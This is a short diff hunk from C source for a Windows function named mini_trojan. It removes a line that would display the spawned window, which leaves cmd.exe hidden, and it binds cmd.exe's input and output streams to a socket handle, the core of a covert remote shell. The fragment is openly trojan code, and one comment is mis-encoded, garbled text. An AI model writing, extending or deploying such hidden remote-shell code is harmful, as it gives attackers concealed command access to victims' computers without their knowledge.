@@ -56,7 +56,6 @@ int mini_trojan()
 	ZeroMemory(&si, sizeof(si));
 	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
 	si.wShowWindow = SW_HIDE;
-	si.wShowWindow = SW_SHOWNORMAL;
 	// ¶ÁÐ´¹ÜµÀ
 	si.hStdInput = si.hStdOutput = si.hStdError = (void*)clientFD;
 	TCHAR cmdLine[] = TEXT("cmd.exe");
